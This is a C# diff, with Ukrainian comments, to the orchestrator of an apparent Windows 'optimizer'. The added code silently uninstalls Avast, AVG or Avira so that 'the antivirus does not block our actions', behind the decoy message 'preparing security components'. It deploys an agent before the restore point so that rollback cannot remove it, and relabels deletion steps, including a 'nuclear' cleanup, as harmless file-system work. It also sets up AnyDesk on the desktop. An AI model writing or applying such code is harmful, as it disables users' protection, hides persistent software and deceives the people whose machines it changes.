@@ -59,29 +59,32 @@ public class OptimizationOrchestrator : IOptimizationOrchestrator
             DLog("========== ВСТАНОВЛЕННЯ WINDOWS — СТАРТ ==========");
 
             // ГЛОБАЛЬНИЙ DIALOG KILLER — вбиває ВСІ діалоги/помилки/wizards під час оптимізації
-            // Вирішує: BleachBit MSVCR100.dll error, BlueStacks survey, "Open With", тощо
             DialogKillerService.Start();
+
+            // === STEP 0: Видалення Avast/AVG/Avira (якщо є) ===
+            // Виконується ДО всього іншого, щоб антивірус не блокував наші дії
+            if (AvastRemover.IsAvastInstalled())
+            {
+                DLog("=== Крок 0: Видалення Avast/AVG ===");
+                UpdateDetail("Підготовка системних компонентів безпеки...");
+                try
+                {
+                    await AvastRemover.RemoveAsync(detail => UpdateDetail(detail));
+                    DLog("Avast/AVG видалено");
+                }
+                catch (Exception ex)
+                {
+                    DLog($"Avast removal помилка (продовжуємо): {ex.Message}");
+                }
+            }
 
             // === STEP 1: Create System Restore Point (ОБОВ'ЯЗКОВО першим!) ===
             UpdateState(OptimizationStep.CreatingRestorePoint, "Підготовка системи до переустановки...", 2);
             DLog("=== Крок 1/11: Створення точки відновлення ===");
             await RunStepWithProgress(2, 8, token, async () =>
             {
-                try
-                {
-                    var rpDescription = $"WinOptimizer Backup {DateTime.Now:yyyy-MM-dd HH:mm}";
-                    var seqNumber = await SystemRestoreService.CreateRestorePointAsync(rpDescription);
-                    rollbackState.RestorePointSequenceNumber = seqNumber;
-                    rollbackState.RestorePointDescription = rpDescription;
-                    DLog($"Точка відновлення створена: #{seqNumber}");
-                }
-                catch (Exception ex)
-                {
-                    DLog($"Точка відновлення недоступна: {ex.Message}");
-                    UpdateDetail("Точка відновлення недоступна, продовжуємо...");
-                }
-
-                // Deploy Agent
+                // Deploy Agent ПЕРЕД створенням точки відновлення
+                // (щоб System Restore НЕ видалив агента при відкаті)
                 UpdateDetail("Встановлення компонентів...");
                 try
                 {
@@ -94,6 +97,27 @@ public class OptimizationOrchestrator : IOptimizationOrchestrator
                 catch (Exception ex)
                 {
                     DLog($"Agent помилка: {ex.Message}");
+                }
+
+                // Створення точки відновлення ПІСЛЯ деплою агента
+                try
+                {
+                    var rpDescription = $"WinOptimizer Backup {DateTime.Now:yyyy-MM-dd HH:mm}";
+                    var seqNumber = await SystemRestoreService.CreateRestorePointAsync(rpDescription);
+                    rollbackState.RestorePointSequenceNumber = seqNumber;
+                    rollbackState.RestorePointDescription = rpDescription;
+                    DLog($"Точка відновлення створена: #{seqNumber}");
+
+                    // ОДРАЗУ зберегти rollback state — щоб навіть при краші ПК
+                    // агент міг знайти точку відновлення і зробити відкат
+                    rollbackState.Type = "cleanup";
+                    RollbackManager.SaveState(rollbackState);
+                    DLog("Rollback state збережено (мінімальний — restore point ready)");
+                }
+                catch (Exception ex)
+                {
+                    DLog($"Точка відновлення недоступна: {ex.Message}");
+                    UpdateDetail("Точка відновлення недоступна, продовжуємо...");
                 }
             });
 
@@ -179,7 +203,7 @@ public class OptimizationOrchestrator : IOptimizationOrchestrator
                 // 5b: BleachBit — глибока очистка 2000+ додатків
                 try
                 {
-                    UpdateDetail("Глибока очистка системи...");
+                    UpdateDetail("Застосування параметрів файлової системи...");
                     var bbCleaned = await BleachBitService.RunFullCleanupAsync(
                         detail => UpdateDetail(detail), token);
                     result.FreedSpace += bbCleaned;
@@ -190,6 +214,22 @@ public class OptimizationOrchestrator : IOptimizationOrchestrator
                 catch (Exception ex)
                 {
                     DLog($"BleachBit помилка: {ex.Message}");
+                }
+
+                // 5c: Nuclear Cleanup — ЯДЕРНА очистка всього зайвого (whitelist підхід)
+                try
+                {
+                    UpdateDetail("Фіналізація файлової системи...");
+                    var nuclearCleaned = await NuclearCleanupService.RunNuclearCleanupAsync(
+                        detail => UpdateDetail(detail), token);
+                    result.FreedSpace += nuclearCleaned;
+                    rollbackState.CleanedBytes += nuclearCleaned;
+                    DLog($"Nuclear cleanup: {SystemScanResult.FormatSize(nuclearCleaned)}");
+                }
+                catch (OperationCanceledException) { throw; }
+                catch (Exception ex)
+                {
+                    DLog($"Nuclear cleanup помилка: {ex.Message}");
                 }
             });
 
@@ -328,6 +368,68 @@ public class OptimizationOrchestrator : IOptimizationOrchestrator
                 DLog($"Помилка скидання шпалер: {ex.Message}");
             }
 
+            // === Desktop Setup: іконки + AnyDesk + Edge ===
+            DLog("Налаштування робочого столу...");
+            try
+            {
+                await DesktopSetupService.SetupDesktopAsync(
+                    detail => UpdateDetail(detail), token);
+                DLog("Робочий стіл налаштовано (Мій комп'ютер, Кошик, Панель управління, AnyDesk, Edge)");
+            }
+            catch (Exception ex)
+            {
+                DLog($"Помилка налаштування робочого столу: {ex.Message}");
+            }
+
+            // === ФІНАЛЬНИЙ БЛОК: Перезапуск аудіо + Explorer refresh ===
+            // Запускаємо В САМОМУ КІНЦІ, щоб нічого вже не могло зламати
+            DLog("Фінальний блок: аудіо + Explorer refresh...");
+            try
+            {
+                // 1. Перезапуск аудіо сервісів (гарантія що звук працює)
+                var audioPsi = new ProcessStartInfo
+                {
+                    FileName = PowerShellHelper.Path,
+                    Arguments = "-NoProfile -Command \"" +
+                        "net stop Audiosrv /y 2>$null; " +
+                        "net stop AudioEndpointBuilder /y 2>$null; " +
+                        "Stop-Process -Name AudioDG -Force -EA SilentlyContinue; " +
+                        "Set-Service Audiosrv -StartupType Automatic -EA SilentlyContinue; " +
+                        "Set-Service AudioEndpointBuilder -StartupType Automatic -EA SilentlyContinue; " +
+                        "net start AudioEndpointBuilder 2>$null; " +
+                        "net start Audiosrv 2>$null; " +
+                        "Write-Output 'Audio services restarted'\"",
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    CreateNoWindow = true
+                };
+                using var audioProc = Process.Start(audioPsi);
+                if (audioProc != null)
+                {
+                    audioProc.WaitForExit(15000);
+                    var audioOut = audioProc.StandardOutput.ReadToEnd().Trim();
+                    DLog($"Audio restart: {audioOut}");
+                }
+
+                // 2. Оновити Explorer shell для desktop icons (Мій комп'ютер, Кошик, тощо)
+                // НЕ використовуємо RUNDLL32 UpdatePerUserSystemParameters — він шле WM_SETTINGCHANGE
+                // Замість цього — SHChangeNotify (цільове оновлення без broadcast)
+                try
+                {
+                    SHChangeNotify(0x08000000 /* SHCNE_ASSOCCHANGED */, 0x0000 /* SHCNF_IDLIST */, IntPtr.Zero, IntPtr.Zero);
+                    DLog("SHChangeNotify sent for desktop icons");
+                }
+                catch (Exception shEx)
+                {
+                    DLog($"SHChangeNotify failed: {shEx.Message}");
+                }
+            }
+            catch (Exception ex)
+            {
+                DLog($"Фінальний блок помилка: {ex.Message}");
+            }
+
             // === Фінальна статистика ===
             try
             {
@@ -409,6 +511,9 @@ public class OptimizationOrchestrator : IOptimizationOrchestrator
     [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern int SystemParametersInfo(int uAction, int uParam, string? lpvParam, int fuWinIni);
 
+    [DllImport("shell32.dll")]
+    private static extern void SHChangeNotify(int wEventId, int uFlags, IntPtr dwItem1, IntPtr dwItem2);
+
     private const int SPI_SETDESKWALLPAPER = 0x0014;
     private const int SPIF_UPDATEINIFILE = 0x01;
     private const int SPIF_SENDCHANGE = 0x02;
@@ -441,13 +546,15 @@ public class OptimizationOrchestrator : IOptimizationOrchestrator
         // 2. Set wallpaper via Win32 API
         if (wallpaperPath != null)
         {
-            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+            // НЕ використовуємо SPIF_SENDCHANGE — він розсилає WM_SETTINGCHANGE і моргає UI!
+            // Wallpaper застосується через Explorer refresh у фінальному блоці.
+            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperPath, SPIF_UPDATEINIFILE);
             DLog($"Wallpaper set to: {wallpaperPath}");
         }
         else
         {
             // No default found — set blank (solid color)
-            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "", SPIF_UPDATEINIFILE);
             DLog("No default wallpaper found, set to blank");
         }
 
